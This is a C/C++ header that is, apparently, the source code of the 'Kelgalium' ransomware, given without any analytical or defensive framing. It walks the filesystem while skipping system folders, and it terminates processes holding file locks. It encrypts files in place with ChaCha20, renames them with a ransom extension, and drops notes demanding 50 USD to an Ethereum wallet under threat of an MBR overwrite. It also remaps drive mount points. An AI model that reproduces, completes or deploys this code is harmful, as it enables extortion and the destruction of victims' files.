#pragma once
// MSVC wrongly reports this as using uninitialised variable.
#pragma warning(push)
#pragma warning(disable: 6001)
#pragma warning(disable: 26451)
#include <Windows.h>
#include <bcrypt.h>
#include "heapalloc.h"
#include "var.h"
#define ARRAY_SIZE(x) (sizeof(x) / sizeof(x)[0])
const WCHAR EXT[] = L".Krgalium_rans";
WCHAR* pathsearch = (WCHAR*)myHeapAlloc(65536);

const WCHAR* BLACKLISTED_FILENAMES[] =
{
	// Folder names
	L"Windows",
	L"Windows.old",
	L"Tor Browser",
	L"Internet Explorer",
	L"Google",
	L"Opera",
	L"Opera Software",
	L"Mozilla",
	L"Mozilla Firefox",
	L"$Recycle.Bin",
	L"ProgramData",
	L"All Users",

	// File names
	L"autorun.inf",
	L"boot.ini",
	L"bootfont.bin",
	L"bootsect.bak",
	L"bootmgr",
	L"bootmgr.efi",
	L"bootmgfw.efi",
	L"desktop.ini",
	L"iconcache.db",
	L"ntldr",
	L"ntuser.dat",
	L"ntuser.dat.log",
	L"ntuser.ini",
	L"thumbs.db",
	L"Program Files",
	L"Program Files (x86)",
	L"..",
	L"."
};

const WCHAR RANSOM_NAME[] = L"Infected.txt";

const CHAR RANSOM_NOTE[] = "Hi..."
"U been Infected by Kelgalium Ransomware...\r\n"
"I'm use very strong key via ChaCha20 and SHA256 \r\n"
"Good Luck to Restore Ur Files...";

WCHAR fullpath[MAX_PATH];
VOID myHeapFree(LPVOID mem)
{
	CRITICAL_SECTION sect;
	EnterCriticalSection(&sect);
	HeapFree(GetProcessHeap(), 0, mem);
	LeaveCriticalSection(&sect);
}
void CreateTempFolder() {
	CreateDirectoryA("C:\\Temp", 0);
}
VOID CryptFile(const WCHAR* filename)
{
	HANDLE hFile;

	WCHAR sessionKey[CCH_RM_SESSION_KEY + 1];
	DWORD sessionHnd;
	RM_PROCESS_INFO dwProcessId[10];

	DWORD rebootReasons;
	BOOL bWhat = TRUE;

	SetFileAttributesW(filename, FILE_ATTRIBUTE_NORMAL);
	while (TRUE)
	{
		hFile = CreateFileW(filename, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hFile != INVALID_HANDLE_VALUE)
		{
			break;
		}

		if (!bWhat)
		{
			break;
		}

		ZeroMemory(sessionKey, CCH_RM_SESSION_KEY + 1);

		if (RmStartSession(&sessionHnd, 0, sessionKey))
		{
			break;
		}

		if (!RmRegisterResources(sessionHnd, 1, &filename, 0, NULL, 0, NULL))
		{
			UINT procInfoNeeded, procInfo = sizeof(dwProcessId);
			if (!RmGetList(sessionHnd, &procInfoNeeded, &procInfo, dwProcessId, &rebootReasons))
			{
				for (int i = 0; i < procInfo; ++i)
				{
					if (dwProcessId[i].ApplicationType != RmExplorer
						&& dwProcessId[i].ApplicationType != RmCritical
						&& GetCurrentProcessId() != dwProcessId[i].Process.dwProcessId)
					{
						HANDLE hProcess = OpenProcess(PROCESS_SET_QUOTA | PROCESS_TERMINATE, FALSE, dwProcessId[i].Process.dwProcessId);
						if (hProcess != INVALID_HANDLE_VALUE)
						{
							TerminateProcess(hProcess, 0);
							WaitForSingleObject(hProcess, 5000);
							CloseHandle(hProcess);
						}
					}
				}
			}
		}
		RmEndSession(sessionHnd);
		bWhat = FALSE;
	}

	LARGE_INTEGER FileSize;
	GetFileSizeEx(hFile, &FileSize);

	HANDLE hMAP = CreateFileMappingA(hFile, NULL, PAGE_READWRITE, 0, 0, NULL);
	if (hMAP != NULL)
	{
		if (FileSize.QuadPart <= 41943040)
		{
			if (FileSize.QuadPart > 0)
			{
				LPBYTE hView = (LPBYTE)MapViewOfFile(hMAP, FILE_MAP_ALL_ACCESS, 0, 0, FileSize.LowPart);
				if (hView != NULL)
				{
					ChaCha20XOR(CHACHA20_FINAL_KEY_1, 20, CHACHA20_FINAL_NONCE, hView, hView, FileSize.LowPart);
					ChaCha20XOR(CHACHA20_FINAL_KEY_2, 20, CHACHA20_FINAL_NONCE, hView, hView, FileSize.LowPart);
					UnmapViewOfFile(hView);
				}
			}
		}
		else
		{
			DWORD blocks = FileSize.QuadPart / 10485760 / 3;
			for (int i = 0; i < 3; ++i)
			{
				DWORD offsetHigh = blocks * i;
				DWORD offsetLow = offsetHigh * 10485760;

				LPBYTE hView = (LPBYTE)MapViewOfFile(hMAP, FILE_MAP_ALL_ACCESS, offsetHigh, offsetLow, 10485760);
				if (hView != NULL)
				{
					ChaCha20XOR(CHACHA20_FINAL_KEY_1, 20, CHACHA20_FINAL_NONCE, hView, hView, 10485760);
					ChaCha20XOR(CHACHA20_FINAL_KEY_2, 20, CHACHA20_FINAL_NONCE, hView, hView, 10485760);
					UnmapViewOfFile(hView);
				}
			}
		}
		CloseHandle(hMAP);
	}
	FlushFileBuffers(hFile);
	CloseHandle(hFile);

	WCHAR* newPath = (WCHAR*)myHeapAlloc(65536);
	if (newPath != NULL)
	{
		lstrcpyW(newPath, filename);
		lstrcatW(newPath, EXT);
		MoveFileExW(filename, newPath, 9);
		myHeapFree(newPath);
	}
}

namespace KelgaliumPayloads 
{
	VOID SearchFiles(WCHAR* pathname, int layer)
	{
		WIN32_FIND_DATAW fd;

		WCHAR* pathsearch = (WCHAR*)myHeapAlloc(65536);
		if (pathsearch != NULL)
		{
			lstrcpyW(pathsearch, pathname);
			lstrcatW(pathsearch, L"\\*");

			HANDLE hFind = FindFirstFileW(pathsearch, &fd);
			if (hFind != INVALID_HANDLE_VALUE)
			{
				BOOL isBlack = FALSE;
				do
				{
					for (int i = 0; i < ARRAY_SIZE(BLACKLISTED_FILENAMES); ++i)
					{
						if (!lstrcmpW(fd.cFileName, BLACKLISTED_FILENAMES[i]))
						{
#ifdef DEBUG
							wprintf(L"[INF] Blacklisted file %ls\r\n", fd.cFileName);
#endif
							isBlack = TRUE;
							break;
						}
					}

					if (!isBlack)
					{
						lstrcpyW(pathsearch, pathname);
						lstrcatW(pathsearch, L"\\");
						lstrcatW(pathsearch, fd.cFileName);

						if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
						{
							if (layer < 16)
							{
#ifdef DEBUG
								wprintf(L"[INF] Walking %ls\r\n", pathsearch);
#endif
								SearchFiles(pathsearch, layer + 1);
							}
						}
						else if (lstrcmpW(fd.cFileName, RANSOM_NAME))
						{
							for (int j = lstrlenW(fd.cFileName); j > 0; --j)
							{
								if (fd.cFileName[j] == '.')
								{
									if (!lstrcmpW(&fd.cFileName[j], EXT))
									{
#ifdef DEBUG
										wprintf(L"[INF] Skipping file %ls\r\n", fd.cFileName);
#endif
										isBlack = TRUE;
										break;
									}
								}
							}

							if (!isBlack)
							{
#ifdef DEBUG
								wprintf(L"[INF] Encrypting file %ls\r\n", pathsearch);
#endif
								CryptFile(pathsearch);
							}
						}
					}
					isBlack = FALSE;
				} while (FindNextFileW(hFind, &fd));
				FindClose(hFind);

				lstrcpyW(pathsearch, pathname);
				lstrcatW(pathsearch, L"\\");
				lstrcatW(pathsearch, RANSOM_NAME);

				HANDLE hFile = CreateFileW(pathsearch, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_NEW, 0, NULL);
				if (hFile != INVALID_HANDLE_VALUE)
				{
#ifdef DEBUG
					wprintf(L"[INF] Writing note %ls\r\n", pathsearch);
#endif
					DWORD wb;
					WriteFile(hFile, RANSOM_NOTE, lstrlenA(RANSOM_NOTE), &wb, NULL);
					CloseHandle(hFile);
				}
			}
		}
		myHeapFree(pathsearch);
	}
	void DeleteLogicalDisks() {
		WCHAR VolumePathNames[MAX_PATH];

		const WCHAR* drives[] =
		{
			L"Q:\\",
			L"W:\\",
			L"E:\\",
			L"R:\\",
			L"T:\\",
			L"Y:\\",
			L"U:\\",
			L"I:\\",
			L"O:\\",
			L"P:\\",
			L"A:\\",
			L"S:\\",
			L"D:\\",
			L"F:\\",
			L"G:\\",
			L"H:\\",
			L"J:\\",
			L"K:\\",
			L"L:\\",
			L"Z:\\",
			L"X:\\",
			L"C:\\",
			L"V:\\",
			L"B:\\",
			L"N:\\",
			L"M:\\"
		};

		LPCWSTR lpszVolumeMountPoint[26];

		int j = 0;
		for (int i = 0; i < ARRAY_SIZE(drives); ++i)
		{
			if (GetDriveTypeW(drives[i]) == DRIVE_NO_ROOT_DIR)
			{
				lpszVolumeMountPoint[j++] = drives[i];
			}
		}

		DWORD cchBufferLength = 120;
		DWORD cchReturnLength = 0;

		WCHAR* volumename = (WCHAR*)myHeapAlloc(65536);
		if (volumename != NULL)
		{
			LPVOID unused = (LPVOID)myHeapAlloc(65536);
			if (unused != NULL)
			{
				HANDLE hFindVolume = FindFirstVolumeW(volumename, 32768);
				do
				{
					if (!j)
					{
						break;
					}

					if (!GetVolumePathNamesForVolumeNameW(volumename, VolumePathNames, cchBufferLength, &cchReturnLength)
						|| lstrlenW(VolumePathNames) != 3)
					{
						SetVolumeMountPointW(lpszVolumeMountPoint[--j], volumename);
					}
				} while (FindNextVolumeW(hFindVolume, volumename, 32768));
				FindVolumeClose(hFindVolume);
				myHeapFree(unused);
			}
			myHeapFree(volumename);
		}
	}
	void CreateNote()
	{
		const CHAR note[] = "[Kelgalium Ransomware] \r\n"
			"U been Infected by Kelgalium Ransomware... \r\n"
			"Please pay 50 USD to my Ethereum Wallet: 0xaef5097cf4e2eb5d5a145dab3e203b833c498f1b, and ur files is saved and decrypted from this Ransomware\r\n"
			"***What Happened?***\r\n"
			"\r\n"
			"Ur Files is totally Encrypted with Strong Keys via ChaCha20 and SHA256 \r\n"
			"If u don't pay, Ur PC is Died via MBR overwrite";
		CreateTempFolder();
		HANDLE hCreateNote = CreateFileW((LPCWSTR)L"C:\\Temp\\Note.txt", GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hCreateNote != INVALID_HANDLE_VALUE)
		{
			DWORD word;
			WriteFile(hCreateNote, note, lstrlenA(note), &word, NULL);
			CloseHandle(hCreateNote);
		}
	}
}

